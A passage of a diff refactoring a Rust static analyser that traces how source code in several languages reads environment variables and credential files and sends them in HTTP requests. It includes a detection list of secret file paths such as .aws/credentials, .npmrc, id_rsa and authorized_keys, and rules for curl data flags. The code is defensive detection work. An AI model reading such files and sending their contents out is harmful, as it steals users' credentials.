+        let imports = super::go_syntax::imports(root, source);
+        let prepared = prepare(
+            source,
+            Lang::Go,
+            collect(root, source, config),
+            &Imports::Go(&imports),
+        );
+        members.push((file.path, root, source, prepared, facts));
+    }
+    let mut seeds = BTreeMap::new();
+    let mut globals = BTreeMap::new();
+    let mut result = Vec::new();
+    for round in 0..MAX_ROUNDS {
         let mut next = BTreeMap::new();
         let mut next_globals = globals.clone();
         let mut duplicates = Vec::new();
         result.clear();
-        for (file, tree) in sources.iter().zip(&trees) {
-            let Some(tree) = tree else {
-                truncated = true;
-                continue;
-            };
-            let mut values = Values::new();
-            let (summaries, bindings) = emit_seeded(
-                tree.root_node(),
-                file.source,
-                Lang::Go,
+        for (path, root, source, prepared, facts) in &members {
+            let mut values = facts.clone();
+            let (summaries, bindings) = analyse(
+                *root,
+                source,
+                config,
+                prepared,
                 &mut values,
                 &seeds,
                 &globals,
-                None,
             );
             truncated |= values
                 .get("source.payload_flow.truncated")
-                .and_then(|v| v.as_bool())
+                .and_then(serde_json::Value::as_bool)
                 == Some(true);
             for (name, summary) in summaries {
                 if next.insert(name.clone(), summary).is_some() {
@@ -587,11 +815,17 @@ pub fn go_package_payload_flow(
             }
             next_globals.extend(bindings);
             result.push(GoFileFlow {
-                path: file.path.to_string(),
+                path: (*path).to_string(),
                 facts: values,
             });
         }
         for name in duplicates {
+            tracing::debug!(
+                target: "filefacts::source",
+                format = "go",
+                helper = %name,
+                "package payload flow: helper defined in more than one member"
+            );
             next.remove(&name);
             truncated = true;
         }
@@ -600,7 +834,7 @@ pub fn go_package_payload_flow(
         }
         seeds = next;
         globals = next_globals;
-        if iteration == 7 {
+        if round == MAX_ROUNDS - 1 {
             truncated = true;
         }
     }
@@ -639,10 +873,46 @@ fn events_for(summary: &Summary, name: &str, offset: usize) -> Vec<serde_json::V
     events
 }
 
+/// Bind the names a Python `import` or `from … import` statement declares
+/// to their dotted targets.
+fn python_imports(node: Node<'_>, source: &str, aliases: &mut HashMap<String, String>) {
+    let module = node.child_by_field_name("module_name");
+    for child in named_children(node) {
+        if Some(child) == module {
+            continue;
+        }
+        let (name, alias) = if child.kind() == "aliased_import" {
+            let (Some(name), Some(alias)) = (
+                child.child_by_field_name("name"),
+                child.child_by_field_name("alias"),
+            ) else {
+                continue;
+            };
+            (text(name, source), text(alias, source))
+        } else if child.kind() == "dotted_name" {
+            (text(child, source), text(child, source))
+        } else {
+            continue;
+        };
+        let target = match module {
+            Some(module) => format!("{}.{name}", text(module, source)),
+            None => name.to_string(),
+        };
+        aliases.insert(alias.to_string(), target);
+    }
+}
+
+/// Union `bits` into `name`'s binding, binding it if it is unbound.
+fn add_bits(bindings: &mut Bindings<'_>, name: &str, bits: Bits) {
+    let bits = bindings.get(name).unwrap_or(0) | bits;
+    bindings.insert(name.to_string(), bits);
+}
+
 impl<'s> Analysis<'s> {
     fn text(&self, node: Node<'_>) -> &'s str {
-        &self.source[node.byte_range()]
+        text(node, self.source)
     }
+
     fn canonical(&self, name: &str) -> String {
         let end = name.find([':', '.']).unwrap_or(name.len());
         match self.aliases.get(&name[..end]).filter(|s| !s.is_empty()) {
@@ -650,39 +920,8 @@ impl<'s> Analysis<'s> {
             None => name.to_string(),
         }
     }
-    fn python_imports(&mut self, node: Node<'_>) {
-        if self.language != Lang::Python {
-            return;
-        }
-        let module = node
-            .child_by_field_name("module_name")
-            .map(|n| self.text(n).to_string());
-        for child in named_children(node) {
-            if Some(child) == node.child_by_field_name("module_name") {
-                continue;
-            }
-            let (name, alias) = if child.kind() == "aliased_import" {
-                let Some(name) = child.child_by_field_name("name") else {
-                    continue;
-                };
-                let Some(alias) = child.child_by_field_name("alias") else {
-                    continue;
-                };
-                (self.text(name).to_string(), self.text(alias).to_string())
-            } else if child.kind() == "dotted_name" {
-                (self.text(child).to_string(), self.text(child).to_string())
-            } else {
-                continue;
-            };
-            self.aliases.insert(
-                alias,
-                module
-                    .as_ref()
-                    .map_or(name.clone(), |m| format!("{m}.{name}")),
-            );
-        }
-    }
-    fn bind(&self, pattern: Node<'_>, bits: Bits, bindings: &mut Scope<'_>) {
+
+    fn bind(&self, pattern: Node<'_>, bits: Bits, bindings: &mut Bindings<'_>) {
         let mut stack = vec![pattern];
         while let Some(node) = stack.pop() {
             if node.kind() == "identifier" {
@@ -692,10 +931,27 @@ impl<'s> Analysis<'s> {
             }
         }
     }
+
+    /// Whether `node` starts `x.len()` or another
+    /// [`Model::metadata_methods`] call written as tokens, inside a macro's
+    /// token tree.
+    fn metadata_tokens(&self, node: Node<'_>) -> bool {
+        node.kind() == "identifier"
+            && node.next_sibling().is_some_and(|dot| {
+                self.text(dot) == "."
+                    && dot.next_sibling().is_some_and(|method| {
+                        self.model.metadata_methods.contains(&self.text(method))
+                            && method
+                                .next_sibling()
+                                .is_some_and(|args| self.text(args) == "()")
+                    })
+            })
+    }
+
     fn eval(
         &mut self,
         node: Node<'_>,
-        bindings: &mut Scope<'_>,
+        bindings: &mut Bindings<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
@@ -706,18 +962,11 @@ impl<'s> Analysis<'s> {
         self.budget -= 1;
         // Measured once: `Node::kind` measures and validates a C string.
         let kind = node.kind();
-        if self.excluded.contains(&node.id())
-            || FUNCTION_KINDS.contains(&kind)
+        if self.test_only.contains(&node.id())
+            || self.config.is_function(node)
             || matches!(
                 kind,
-                "arrow_function"
-                    | "function_expression"
-                    | "closure_expression"
-                    | "func_literal"
-                    | "macro_definition"
-                    | "comment"
-                    | "line_comment"
-                    | "block_comment"
+                "macro_definition" | "comment" | "line_comment" | "block_comment"
             )
         {
             return 0;
@@ -734,96 +983,21 @@ impl<'s> Analysis<'s> {
         if self.language == Lang::Rust && kind == "token_tree" {
             let mut result = 0;
             for child in named_children(node) {
-                let metadata_only = child.kind() == "identifier"
-                    && child.next_sibling().is_some_and(|dot| {
-                        self.text(dot) == "."
-                            && dot.next_sibling().is_some_and(|method| {
-                                matches!(
-                                    self.text(method),
-                                    "len" | "is_empty" | "is_ok" | "is_err" | "is_some" | "is_none"
-                                ) && method
-                                    .next_sibling()
-                                    .is_some_and(|args| self.text(args) == "()")
-                            })
-                    });
-                if !metadata_only {
+                if !self.metadata_tokens(child) {
                     result |= self.eval(child, bindings, out, depth + 1);
                 }
             }
             return result;
         }
         if self.language == Lang::Rust && kind == "match_expression" {
-            let input = node
-                .child_by_field_name("value")
-                .map_or(0, |value| self.eval(value, bindings, out, depth + 1));
-            let mut result = 0;
-            let mut merged: HashMap<String, Bits> = HashMap::new();
-            if let Some(body) = node.child_by_field_name("body") {
-                for arm in named_children(body).filter(|n| n.kind() == "match_arm") {
-                    let mut branch = Scope::under(bindings);
-                    let mut pattern_names = Scope::default();
-                    if let Some(pattern) = arm.child_by_field_name("pattern") {
-                        self.bind(pattern, input, &mut branch);
-                        self.bind(pattern, 0, &mut pattern_names);
-                    }
-                    if let Some(value) = arm.child_by_field_name("value") {
-                        result |= self.eval(value, &mut branch, out, depth + 1);
-                    }
-                    // Arm-local pattern bindings never escape the match.
-                    for (name, bits) in branch.local {
-                        if !pattern_names.local.contains_key(&name) {
-                            if let Some(bits) = bits {
-                                *merged.entry(name).or_default() |= bits;
-                            }
-                        }
-                    }
-                }
-            }
-            for (name, bits) in merged {
-                bindings.add_bits(&name, bits);
-            }
-            return result;
+            return self.match_expression(node, bindings, out, depth);
         }
         if kind == "macro_invocation"
             && node
                 .child_by_field_name("macro")
                 .is_some_and(|n| matches!(self.text(n), "format" | "format_args" | "std::format"))
         {
-            let mut bits = self.all(node, bindings, out, depth + 1);
-            let mut stack: Vec<_> = named_children(node).collect();
-            while let Some(child) = stack.pop() {
-                if child.kind() == "string_literal" {
-                    let literal = self.text(child);
-                    let bytes = literal.as_bytes();
-                    let mut index = 0;
-                    while let Some(&byte) = bytes.get(index) {
-                        if byte == b'{' {
-                            if bytes.get(index + 1) == Some(&b'{') {
-                                index += 2;
-                                continue;
-                            }
-                            let start = index + 1;
-                            let mut end = start;
-                            while bytes
-                                .get(end)
-                                .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
-                            {
-                                end += 1;
-                            }
-                            if end > start && matches!(bytes.get(end), Some(b'}' | b':')) {
-                                bits |= literal
-                                    .get(start..end)
-                                    .and_then(|name| bindings.get(name))
-                                    .unwrap_or(0);
-                            }
-                        }
-                        index += 1;
-                    }
-                } else {
-                    stack.extend(named_children(child));
-                }
-            }
-            return bits;
+            return self.format_macro(node, bindings, out, depth);
         }
         if matches!(
             kind,
@@ -833,42 +1007,12 @@ impl<'s> Analysis<'s> {
                 | "interpreted_string_literal"
                 | "string_fragment"
         ) {
-            let mut bits = 0;
-            if text.contains(".cargo/credentials") || text.contains(".cargo\\\\credentials") {
-                bits |= CARGOPATH | SECRETPATH;
-            }
-            if [
-                ".npmrc",
-                ".pypirc",
-                ".aws/credentials",
-                ".netrc",
-                ".git-credentials",
-                "id_rsa",
-                "id_ed25519",
-                ".env",
-                ".kube/config",
-                "application_default_credentials.json",
-                ".terraform.d/credentials",
-                "credentials.tfrc.json",
-            ]
-            .iter()
-            .any(|p| text.contains(p))
-            {
-                bits |= SECRETPATH;
-            }
-            if text.contains("authorized_keys") {
-                bits |= AUTHPATH;
-            }
-            if matches!(
-                text.trim_matches(['\'', '"']),
-                "credentials" | "credentials.toml"
-            ) {
-                bits |= CREDFILENAME;
-            }
-            return bits;
+            return path_bits(text);
         }
         if matches!(kind, "import_statement" | "import_from_statement") {
-            self.python_imports(node);
+            if self.language == Lang::Python {
+                python_imports(node, self.source, &mut self.aliases);
+            }
             return 0;
         }
         if matches!(
@@ -893,6 +1037,7 @@ impl<'s> Analysis<'s> {
                 .or_else(|| node.child_by_field_name("name"));
             if let (Some(target), Some(value)) = (target, value) {
                 if self.language == Lang::Go && target.kind() == "selector_expression" {
+                    // `req.Body = …` replaces a request's body.
                     if target
                         .child_by_field_name("field")
                         .is_some_and(|n| self.text(n) == "Body")
@@ -935,36 +1080,7 @@ impl<'s> Analysis<'s> {
             }
         }
         if matches!(kind, "if_statement" | "if_expression") {
-            let condition = node.child_by_field_name("condition");
-            // Reachability is enforced only for the module-execution fact.
-            if self.language.is_ecmascript()
-                && condition.is_some_and(|n| self.text(n).trim_matches(['(', ')', ' ']) == "false")
-            {
-                return 0;
-            }
-            if let Some(condition) = condition {
-                self.eval(condition, bindings, out, depth + 1);
-            }
-            // What the branches bind, unioned into the bindings before the
-            // `if`. A name a branch leaves alone keeps its bits there, so only
-            // the branch's own layer can add any.
-            let mut merged: HashMap<String, Bits> = HashMap::new();
-            let mut result = 0;
-            for field in ["consequence", "alternative"] {
-                if let Some(branch) = node.child_by_field_name(field) {
-                    let mut branch_bindings = Scope::under(bindings);
-                    result |= self.eval(branch, &mut branch_bindings, out, depth + 1);
-                    for (name, bits) in branch_bindings.local {
-                        if let Some(bits) = bits {
-                            *merged.entry(name).or_default() |= bits;
-                        }
-                    }
-                }
-            }
-            for (name, bits) in merged {
-                bindings.add_bits(&name, bits);
-            }
-            return result;
+            return self.if_statement(node, bindings, out, depth);
         }
         if matches!(kind, "call_expression" | "call") {
             return self.call(node, bindings, out, depth + 1);
@@ -982,131 +1098,285 @@ impl<'s> Analysis<'s> {
                 | "subscript_expression"
                 | "selector_expression"
         ) {
-            let canonical = self.canonical(text);
-            if self.language == Lang::Go && canonical == "net/http.DefaultClient" {
-                return CLIENT;
-            }
-            if canonical == "os.environ" || canonical == "process.env" {
-                if self.language.is_ecmascript() {
-                    return ENV_OBJECT;
-                }
-                return ENV | SECRET;
-            }
-            if self.language.is_ecmascript() {
-                let object = node
-                    .child_by_field_name("object")
-                    .or_else(|| node.child_by_field_name("value"));
-                let property = node
-                    .child_by_field_name("property")
-                    .or_else(|| node.child_by_field_name("field"));
-                let object_bits = object.map(|object| self.eval(object, bindings, out, depth + 1));
-                if object_bits.is_some_and(|bits| bits & ENV_OBJECT != 0) {
-                    if let Some(property) = property {
-                        return env_bits(self.text(property));
-                    }
-                    let index = node
-                        .child_by_field_name("index")
-                        .or_else(|| node.child_by_field_name("subscript"));
-                    if let Some(index) = index {
-                        let key = self.text(index).trim_matches(['\'', '"', '`']);
-                        if key != self.text(index) {
-                            return env_bits(key);
-                        }
-                    }
-                    // A dynamic key may select a credential, so retain the
-                    // conservative source classification.
-                    return ENV | SECRET;
-                }
-                if is_env_member(&canonical) {
-                    return env_bits(text);
-                }
-                // `object` is already evaluated; letting the fallback `all`
-                // evaluate it again would double the work at every link of a
-                // member chain.
-                return named_children(node)
-                    .filter(|child| Some(*child) != object)
-                    .fold(object_bits.unwrap_or(0), |bits, child| {
-                        bits | self.eval(child, bindings, out, depth + 1)
-                    });
-            }
-            if is_env_member(&canonical) {
-                return env_bits(text);
+            if let Some(bits) = self.member(node, bindings, out, depth) {
+                return bits;
             }
         }
-        if self.language == Lang::Go && kind == "composite_literal" {
-            if node
-                .child_by_field_name("type")
-                .is_some_and(|n| self.canonical(self.text(n)) == "net/http.Client")
-            {
-                return CLIENT;
-            }
+        if self.language == Lang::Go
+            && kind == "composite_literal"
+            && node.child_by_field_name("type").is_some_and(|n| {
+                self.model
+                    .client_types
+                    .contains(&self.canonical(self.text(n)).as_str())
+            })
+        {
+            return CLIENT;
         }
         if matches!(
             kind,
             "block" | "statement_block" | "source_file" | "module" | "program"
         ) {
-            let mut tail = 0;
-            let scoped = matches!(
-                self.language,
-                Lang::Rust | Lang::JavaScript | Lang::TypeScript
-            ) && matches!(kind, "block" | "statement_block");
-            // The names the block declares are restored after it. Only theirs
-            // are saved: copying every binding per block was quadratic.
-            let mut declared = Scope::default();
-            if scoped {
-                for child in named_children(node) {
-                    if child.kind() == "let_declaration" {
-                        if let Some(pattern) = child.child_by_field_name("pattern") {
-                            self.bind(pattern, 0, &mut declared);
-                        }
-                    }
-                    if child.kind() == "lexical_declaration" {
-                        for declaration in named_children(child) {
-                            if let Some(name) = declaration.child_by_field_name("name") {
-                                self.bind(name, 0, &mut declared);
-                            }
-                        }
-                    }
-                }
-            }
-            let before: Vec<(String, Option<Bits>)> = declared
-                .local
-                .into_keys()
-                .map(|name| {
-                    let old = bindings.get(&name);
-                    (name, old)
-                })
-                .collect();
-            for child in named_children(node) {
-                tail = self.eval(child, bindings, out, depth + 1);
-            }
-            for (name, old) in before {
-                if let Some(old) = old {
-                    bindings.insert(name, old);
-                } else {
-                    bindings.remove(&name);
-                }
-            }
-            return tail;
+            return self.block(node, bindings, out, depth);
         }
         self.all(node, bindings, out, depth + 1)
     }
+
+    fn match_expression(
+        &mut self,
+        node: Node<'_>,
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Bits {
+        let input = node
+            .child_by_field_name("value")
+            .map_or(0, |value| self.eval(value, bindings, out, depth + 1));
+        let mut result = 0;
+        let mut merged: BTreeMap<String, Bits> = BTreeMap::new();
+        if let Some(body) = node.child_by_field_name("body") {
+            for arm in named_children(body).filter(|n| n.kind() == "match_arm") {
+                let mut branch = Bindings::under(bindings);
+                let mut pattern_names = Bindings::default();
+                if let Some(pattern) = arm.child_by_field_name("pattern") {
+                    self.bind(pattern, input, &mut branch);
+                    self.bind(pattern, 0, &mut pattern_names);
+                }
+                if let Some(value) = arm.child_by_field_name("value") {
+                    result |= self.eval(value, &mut branch, out, depth + 1);
+                }
+                // Arm-local pattern bindings never escape the match.
+                for (name, bits) in branch.bound() {
+                    if pattern_names.get(name).is_none() {
+                        *merged.entry(name.clone()).or_default() |= bits;
+                    }
+                }
+            }
+        }
+        for (name, bits) in merged {
+            add_bits(bindings, &name, bits);
+        }
+        result
+    }
+
+    /// `format!` and friends: the arguments, plus every binding named inline
+    /// in a format string (`"{token}"`).
+    fn format_macro(
+        &mut self,
+        node: Node<'_>,
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Bits {
+        let mut bits = self.all(node, bindings, out, depth + 1);
+        let mut stack: Vec<_> = named_children(node).collect();
+        while let Some(child) = stack.pop() {
+            if child.kind() != "string_literal" {
+                stack.extend(named_children(child));
+                continue;
+            }
+            let literal = self.text(child);
+            let bytes = literal.as_bytes();
+            let mut index = 0;
+            while let Some(&byte) = bytes.get(index) {
+                if byte == b'{' {
+                    if bytes.get(index + 1) == Some(&b'{') {
+                        index += 2;
+                        continue;
+                    }
+                    let start = index + 1;
+                    let mut end = start;
+                    while bytes
+                        .get(end)
+                        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
+                    {
+                        end += 1;
+                    }
+                    if end > start && matches!(bytes.get(end), Some(b'}' | b':')) {
+                        bits |= literal
+                            .get(start..end)
+                            .and_then(|name| bindings.get(name))
+                            .unwrap_or(0);
+                    }
+                }
+                index += 1;
+            }
+        }
+        bits
+    }
+
+    fn if_statement(
+        &mut self,
+        node: Node<'_>,
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Bits {
+        let condition = node.child_by_field_name("condition");
+        // Reachability is enforced only for the module-execution fact.
+        if self.language.is_ecmascript()
+            && condition.is_some_and(|n| self.text(n).trim_matches(['(', ')', ' ']) == "false")
+        {
+            return 0;
+        }
+        if let Some(condition) = condition {
+            self.eval(condition, bindings, out, depth + 1);
+        }
+        // What the branches bind, unioned into the bindings before the `if`.
+        // A name a branch leaves alone keeps its bits there, so only the
+        // branch's own layer can add any.
+        let mut merged: BTreeMap<String, Bits> = BTreeMap::new();
+        let mut result = 0;
+        for field in ["consequence", "alternative"] {
+            if let Some(branch) = node.child_by_field_name(field) {
+                let mut branch_bindings = Bindings::under(bindings);
+                result |= self.eval(branch, &mut branch_bindings, out, depth + 1);
+                for (name, bits) in branch_bindings.bound() {
+                    *merged.entry(name.clone()).or_default() |= bits;
+                }
+            }
+        }
+        for (name, bits) in merged {
+            add_bits(bindings, &name, bits);
+        }
+        result
+    }
+
+    /// A member or subscript read, or `None` to evaluate it as an ordinary
+    /// expression.
+    fn member(
+        &mut self,
+        node: Node<'_>,
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Option<Bits> {
+        let text = self.text(node);
+        let canonical = self.canonical(text);
+        if self.model.client_members.contains(&canonical.as_str()) {
+            return Some(CLIENT);
+        }
+        if self.model.environ_members.contains(&canonical.as_str()) {
+            return Some(if self.language.is_ecmascript() {
+                ENV_OBJECT
+            } else {
+                ENV | SECRET
+            });
+        }
+        let selects_variable = self
+            .model
+            .env_var_members
+            .iter()
+            .any(|prefix| canonical.starts_with(prefix));
+        if !self.language.is_ecmascript() {
+            return selects_variable.then(|| env_bits(text));
+        }
+        let object = node
+            .child_by_field_name("object")
+            .or_else(|| node.child_by_field_name("value"));
+        let property = node
+            .child_by_field_name("property")
+            .or_else(|| node.child_by_field_name("field"));
+        let object_bits = object.map(|object| self.eval(object, bindings, out, depth + 1));
+        if object_bits.is_some_and(|bits| bits & ENV_OBJECT != 0) {
+            if let Some(property) = property {
+                return Some(env_bits(self.text(property)));
+            }
+            let index = node
+                .child_by_field_name("index")
+                .or_else(|| node.child_by_field_name("subscript"));
+            if let Some(index) = index {
+                let key = self.text(index).trim_matches(['\'', '"', '`']);
+                if key != self.text(index) {
+                    return Some(env_bits(key));
+                }
+            }
+            // A dynamic key may select a credential, so retain the
+            // conservative source classification.
+            return Some(ENV | SECRET);
+        }
+        if selects_variable {
+            return Some(env_bits(text));
+        }
+        // `object` is already evaluated; letting the fallback `all` evaluate
+        // it again would double the work at every link of a member chain.
+        Some(
+            named_children(node)
+                .filter(|child| Some(*child) != object)
+                .fold(object_bits.unwrap_or(0), |bits, child| {
+                    bits | self.eval(child, bindings, out, depth + 1)
+                }),
+        )
+    }
+
+    fn block(
+        &mut self,
+        node: Node<'_>,
+        bindings: &mut Bindings<'_>,
+        out: &mut Summary,
+        depth: usize,
+    ) -> Bits {
+        let mut tail = 0;
+        let scoped = matches!(
+            self.language,
+            Lang::Rust | Lang::JavaScript | Lang::TypeScript
+        ) && matches!(node.kind(), "block" | "statement_block");
+        // The names the block declares are restored after it. Only theirs
+        // are saved: copying every binding per block is quadratic.
+        let mut declared = Bindings::default();
+        if scoped {
+            for child in named_children(node) {
+                if child.kind() == "let_declaration" {
+                    if let Some(pattern) = child.child_by_field_name("pattern") {
+                        self.bind(pattern, 0, &mut declared);
+                    }
+                }
+                if child.kind() == "lexical_declaration" {
+                    for declaration in named_children(child) {
+                        if let Some(name) = declaration.child_by_field_name("name") {
+                            self.bind(name, 0, &mut declared);
+                        }
+                    }
+                }
+            }
+        }
+        let before: Vec<(String, Option<Bits>)> = declared
+            .into_names()
+            .map(|name| {
+                let old = bindings.get(&name);
+                (name, old)
+            })
+            .collect();
+        for child in named_children(node) {
+            tail = self.eval(child, bindings, out, depth + 1);
+        }
+        for (name, old) in before {
+            if let Some(old) = old {
+                bindings.insert(name, old);
+            } else {
+                bindings.remove(&name);
+            }
+        }
+        tail
+    }
+
     fn all(
         &mut self,
         node: Node<'_>,
-        bindings: &mut Scope<'_>,
+        bindings: &mut Bindings<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
         named_children(node).fold(0, |bits, n| bits | self.eval(n, bindings, out, depth + 1))
     }
+
     fn call(
         &mut self,
         node: Node<'_>,
-        bindings: &mut Scope<'_>,
+        bindings: &mut Bindings<'_>,
         out: &mut Summary,
         depth: usize,
     ) -> Bits {
+        let model = self.model;
         let Some(mut callee) = node.child_by_field_name("function") else {
             return 0;
         };
@@ -1118,7 +1388,7 @@ impl<'s> Analysis<'s> {
         }
         let raw = self.text(callee);
         let prefix = raw.split([':', '.']).next().unwrap_or(raw);
-        let name = if bindings.contains(prefix) {
+        let name = if bindings.get(prefix).is_some() {
             raw.to_string()
         } else {
             self.canonical(raw)
@@ -1143,57 +1413,11 @@ impl<'s> Analysis<'s> {
             .map(|&n| self.eval(n, bindings, out, depth + 1))
             .collect();
         let all = bits.iter().fold(0, |a, b| a | b);
-        if self.language == Lang::Rust
-            && receiver.is_some()
-            && args.is_empty()
-            && matches!(
-                method,
-                "len" | "is_empty" | "is_ok" | "is_err" | "is_some" | "is_none"
-            )
-        {
+        let is = |names: &[&str]| names.contains(&name.as_str());
+        if receiver.is_some() && args.is_empty() && model.metadata_methods.contains(&method) {
             return 0;
         }
-        if self.language == Lang::Go {
-            if name == "os.Environ" {
-                return ENV | SECRET;
-            }
-            if matches!(name.as_str(), "os.Getenv" | "os.LookupEnv") {
-                return args.first().map_or(0, |n| env_bits(self.text(*n)));
-            }
-            if matches!(
-                name.as_str(),
-                "net/http.NewRequest" | "net/http.NewRequestWithContext"
-            ) {
-                return REQUEST | bits.last().copied().unwrap_or(0);
-            }
-            if name == "net/http.Post" || recv & CLIENT != 0 && method == "Post" {
-                out.http = true;
-                out.body |= bits.get(2).copied().unwrap_or(0);
-                return 0;
-            }
-            if name == "net/http.PostForm" || recv & CLIENT != 0 && method == "PostForm" {
-                out.http = true;
-                out.body |= bits.get(1).copied().unwrap_or(0);
-                return 0;
-            }
-            if recv & CLIENT != 0 && method == "Do" {
-                out.http = true;
-                out.body |= bits.first().copied().unwrap_or(0) & !REQUEST;
-                return 0;
-            }
-            // Headers/authentication are not body mutations. Only builders of
-            // form/body data carry Set/Add/Write arguments into later Encode.
-            if matches!(method, "SetBasicAuth" | "AddCookie") || raw.contains(".Header.") {
-                return 0;
-            }
-            if matches!(method, "Set" | "Add" | "Write" | "WriteString") {
-                if let Some(receiver) = receiver {
-                    bindings.add_bits(self.text(receiver), all);
-                }
-                return 0;
-            }
-        }
-        if matches!(name.as_str(), "std::process::Command::new" | "Command::new")
+        if is(model.process_calls)
             && args
                 .first()
                 .is_some_and(|n| self.text(*n).trim_matches('"') == "curl")
@@ -1201,186 +1425,109 @@ impl<'s> Analysis<'s> {
             return CURL_COMMAND;
         }
         if recv & CURL_COMMAND != 0 {
-            let mut state = recv;
-            let command_args = if method == "args" {
-                args.first()
-                    .map(|n| {
-                        let mut n = *n;
-                        while n.kind() == "reference_expression" {
-                            let Some(child) = n.named_child(0) else { break };
-                            n = child;
-                        }
-                        named_children(n).collect()
-                    })
-                    .unwrap_or_default()
-            } else {
-                args.clone()
-            };
-            if matches!(method, "arg" | "args") {
-                for arg in command_args {
-                    if state & CURL_DATA_NEXT != 0 {
-                        out.body |= self.eval(arg, bindings, out, depth + 1);
-                        out.http = true;
-                        state &= !CURL_DATA_NEXT;
-                    } else if matches!(
-                        self.text(arg).trim_matches('"'),
-                        "-d" | "--data"
-                            | "--data-raw"
-                            | "--data-binary"
-                            | "--json"
-                            | "-F"
-                            | "--form"
-                    ) {
-                        state |= CURL_DATA_NEXT;
-                    }
-                }
-            }
-            return state;
+            return self.curl_arguments(recv, method, &args, bindings, out, depth);
         }
-        if matches!(
-            name.as_str(),
-            "std::env::vars" | "std::env::vars_os" | "env::vars" | "env::vars_os"
-        ) {
+        if is(model.environ_calls) {
             return ENV | SECRET;
         }
-        if matches!(
-            name.as_str(),
-            "std::env::var"
-                | "std::env::var_os"
-                | "env::var"
-                | "env::var_os"
-                | "os.getenv"
-                | "os.environ.get"
-        ) {
-            let bits = args.first().map_or(0, |n| env_bits(self.text(*n)))
-                | if self.language == Lang::Rust {
-                    ENV_VALUE
-                } else {
-                    0
-                };
+        if is(model.env_var_calls) {
+            let bits = args.first().map_or(0, |n| env_bits(self.text(*n))) | ENV_VALUE;
             out.reads |= bits;
             return bits;
         }
-        if name.contains("reqwest::")
-            && (name.ends_with("Client::new") || name.ends_with("Client::builder"))
-            || name == "requests.Session"
-            || name == "httpx.Client"
-            || name == "httpx.AsyncClient"
-            || name == "curl::easy::Easy::new"
-        {
+        if is(model.request_calls) {
+            return REQUEST | bits.last().copied().unwrap_or(0);
+        }
+        if is(model.client_calls) {
             return CLIENT;
         }
-        let python_http = name.starts_with("requests.") || name.starts_with("httpx.");
-        let request = (recv & CLIENT != 0
-            && matches!(method, "post" | "put" | "patch" | "get" | "request"))
-            || name.starts_with("ureq::") && matches!(method, "post" | "put" | "get" | "patch")
-            || python_http;
-        if request {
-            out.http = true;
-        }
-        if (recv & REQUEST != 0
-            && matches!(
-                method,
-                "body"
-                    | "json"
-                    | "form"
-                    | "multipart"
-                    | "send_json"
-                    | "send_form"
-                    | "send_bytes"
-                    | "send_string"
-                    | "send"
-            ))
-            || (recv & CLIENT != 0 && method == "post_fields_copy")
-        {
-            out.body |= all;
-        }
-        if (python_http || recv & CLIENT != 0)
-            && matches!(
-                method.rsplit('.').next().unwrap_or(method),
-                "post" | "put" | "patch" | "request"
-            )
-        {
-            for (index, (arg, arg_bits)) in args.iter().zip(&bits).enumerate() {
-                if arg.kind() == "keyword_argument"
-                    && arg
-                        .child_by_field_name("name")
-                        .is_some_and(|n| matches!(self.text(n), "data" | "json" | "files"))
-                    || self.language == Lang::Python
-                        && index == 1
-                        && arg.kind() != "keyword_argument"
-                {
-                    out.body |= arg_bits;
-                }
+        let on_client = recv & CLIENT != 0
+            || model
+                .client_modules
+                .iter()
+                .any(|module| name.starts_with(module));
+        let sent = model.sends.iter().find(|send| {
+            if send.on_client {
+                on_client && method == send.name
+            } else {
+                name == send.name
             }
-        }
-        if name == "fetch" {
+        });
+        if let Some(send) = sent {
             out.http = true;
-            if let Some(options) = args.get(1) {
-                for pair in named_children(*options) {
-                    if pair
-                        .child_by_field_name("key")
-                        .is_some_and(|n| self.text(n).trim_matches(['\'', '"']) == "body")
-                    {
-                        if let Some(value) = pair.child_by_field_name("value") {
-                            out.body |= self.eval(value, bindings, out, depth + 1);
+            match send.body {
+                Body::None => {}
+                Body::Arg(index) => {
+                    out.body |= bits.get(index).copied().unwrap_or(0);
+                    return 0;
+                }
+                Body::Request => {
+                    out.body |= bits.first().copied().unwrap_or(0) & !REQUEST;
+                    return 0;
+                }
+                Body::Keywords => {
+                    for (index, (arg, arg_bits)) in args.iter().zip(&bits).enumerate() {
+                        let body = if arg.kind() == "keyword_argument" {
+                            arg.child_by_field_name("name")
+                                .is_some_and(|n| model.keyword_bodies.contains(&self.text(n)))
+                        } else {
+                            index == 1
+                        };
+                        if body {
+                            out.body |= arg_bits;
+                        }
+                    }
+                }
+                Body::Options => {
+                    if let Some(options) = args.get(1) {
+                        for pair in named_children(*options) {
+                            if pair
+                                .child_by_field_name("key")
+                                .is_some_and(|n| self.text(n).trim_matches(['\'', '"']) == "body")
+                            {
+                                if let Some(value) = pair.child_by_field_name("value") {
+                                    out.body |= self.eval(value, bindings, out, depth + 1);
+                                }
+                            }
                         }
                     }
                 }
             }
         }
-        let file_read = matches!(
-            name.as_str(),
-            "std::fs::read"
-                | "std::fs::read_to_string"
-                | "fs::read"
-                | "fs::read_to_string"
-                | "open"
-                | "fs.readFileSync"
-                | "fs.readFile"
-                | "os.ReadFile"
-                | "io/ioutil.ReadFile"
-                | "os.Open"
-                | "io.ReadAll"
-                | "io/ioutil.ReadAll"
-        ) || matches!(
-            method,
-            "read_text" | "read_bytes" | "read_to_end" | "read_to_string"
-        );
-        if file_read {
+        if model.auth_methods.contains(&method)
+            || model
+                .header_selectors
+                .iter()
+                .any(|selector| raw.contains(selector))
+        {
+            return 0;
+        }
+        if (recv & REQUEST != 0 && model.body_methods.contains(&method))
+            || (recv & CLIENT != 0 && model.client_body_methods.contains(&method))
+        {
+            out.body |= all;
+        }
+        let read_method = model.file_read_methods.contains(&method);
+        if is(model.file_read_calls) || read_method {
             let path = all | recv;
-            let bits = (path & (((1 << PARAM_COUNT) - 1) << PARAM_START))
-                | FILE
-                | if path & SECRETPATH != 0 {
-                    CREDFILE | SECRET
-                } else {
-                    0
-                }
-                | if path & CARGOPATH != 0 {
-                    CARGO | CREDFILE | SECRET
-                } else {
-                    0
-                };
